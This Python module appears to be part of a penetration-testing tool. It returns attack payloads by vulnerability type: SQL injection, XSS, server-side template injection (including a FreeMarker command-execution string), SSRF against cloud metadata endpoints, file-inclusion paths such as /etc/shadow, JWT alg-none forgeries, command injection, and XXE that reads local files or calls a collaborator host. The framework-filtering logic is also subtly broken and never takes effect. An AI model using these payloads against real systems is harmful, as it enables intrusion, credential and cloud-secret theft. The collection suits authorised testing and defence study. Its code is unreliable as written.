"""
Payload Generator — context-aware payloads from discovered tech stack.
Generates SQLi maps, XSS cheatsheets, SSTI payloads per framework.
"""
import json

PAYLOAD_DB = {
    "sqli": {
        "mysql": ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--", "' OR 1=1#", "1' AND SLEEP(5)--"],
        "postgresql": ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--", "1'; SELECT pg_sleep(5)--"],
        "sqlite": ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"],
        "mssql": ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--", "1'; WAITFOR DELAY '0:0:5'--"],
    },
    "xss": {
        "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'-alert(1)-'"],
        "bypass": ["<svg/onload=alert(1)>", "<details open ontoggle=alert(1)>", "<img src=x onerror=alert(1)>"],
        "dom": ["javascript:alert(1)", "#\" onfocus=alert(1) autofocus>", "\"><script>alert(1)</script>"],
    },
    "ssti": {
        "jinja2": ["{{7*7}}", "{{config}}", "{{self.__init__.__globals__}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
        "twig": ["{{7*7}}", "{{_self}}", "{{app.request.server.all}}"],
        "freemarker": ["${7*7}", "${product}", "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}"],
    },
    "ssrf": {
        "aws": ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/user-data/"],
        "gcp": ["http://metadata.google.internal/computeMetadata/v1/"],
        "azure": ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
    },
    "lfi": {
        "linux": ["/etc/passwd", "/etc/shadow", "/proc/self/environ", "/var/log/apache2/access.log"],
        "windows": ["C:\\Windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts"],
    },
    "jwt": {
        "alg_none": ['{"alg":"none","typ":"JWT"}', '{"alg":"None","typ":"JWT"}'],
        "weak_secrets": ["secret", "jwt_secret", "changeme", "password"],
    },
    "command_injection": {
        "linux": ["; id", "| id", "`id`", "$(id)", "|| id", "&& id", "\nid"],
        "windows": ["| whoami", "& whoami", "&& whoami"],
    },
    "xxe": {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR/">]><root>&xxe;</root>',
        ],
    },
}


def generate_payloads(vuln_type: str, context: str = "", framework: str = "") -> str:
    """Generate payloads for a vulnerability type, optionally filtered by framework."""
    vuln = vuln_type.lower().replace(" ", "_").replace("-", "_")
    db = PAYLOAD_DB.get(vuln, {})

    if not db:
        return f"No payloads for {vuln_type}. Available: {', '.join(PAYLOAD_DB.keys())}"

    # If database has sub-categories
    if isinstance(list(db.values())[0], list):
        # Top-level lists — return all
        return json.dumps({"type": vuln_type, "payloads": db}, indent=2)

    # Nested (framework-specific) format
    if framework and framework.lower() in db:
        return json.dumps({"type": vuln_type, "framework": framework, "payloads": db[framework.lower()]}, indent=2)

    result = {}
    for fw, payloads in db.items():
        result[fw] = payloads
    return json.dumps({"type": vuln_type, "frameworks": result}, indent=2)


def list_payload_types() -> str:
    """List all available payload types."""
    lines = []
    for vuln, frameworks in PAYLOAD_DB.items():
        if isinstance(list(frameworks.values())[0], list):
            fw_list = ", ".join(frameworks.keys())
            lines.append(f"{vuln}: {fw_list}")
        else:
            lines.append(f"{vuln}: {len(frameworks)} payloads")
    return "\n".join(lines)
